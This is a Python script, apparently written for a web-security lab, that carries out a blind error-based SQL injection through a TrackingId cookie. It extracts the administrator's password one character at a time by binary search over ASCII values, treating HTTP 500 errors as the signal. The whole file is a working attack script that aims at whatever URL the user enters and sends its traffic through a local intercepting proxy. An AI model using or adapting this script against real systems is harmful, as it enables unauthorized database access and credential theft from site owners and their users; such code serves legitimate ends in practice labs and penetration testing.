import sys
import urllib
import urllib3
import requests
import math

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def sql_injected_query(url, num, oper, pas):
    payload = "' and (select case when (1=1) then (1/0) else 1 end from users where username = 'administrator' and ascii(substr(password, %s, 1)) %s %s) = 1--" % (num, oper, pas)
    payload_endcoded = urllib.parse.quote(payload)
    cookies = {"TrackingId": "URCGVbT9J1iLabQp" + payload_endcoded, "session": "5DsbPb2YLkJTc1yq9wWyM6L9mtdlzmMI"} 
    return requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    

def sql_inject(url):
    password = ""
    for i in range(1,21):
        first = 32
        last = 126
        while first <= last:
            middle = math.floor(first + (last - first)/2)
            if sql_injected_query(url,i, '=', middle).status_code == 500:
                password += chr(middle) 
                sys.stdout.write("\r" + password)
                sys.stdout.flush
                break
            elif sql_injected_query(url, i, '>', middle).status_code == 500:
                sys.stdout.write("\r" + password + chr(middle))
                sys.stdout.flush
                first = middle + 1
            else:
                sys.stdout.write("\r" + password + chr(middle))
                sys.stdout.flush
                last = middle - 1
                
            

def main():
    url = input("Enter URL here:")
    print("(+) Retrieving Passwords...")
    sql_inject(url)

if __name__ == "__main__":
    main()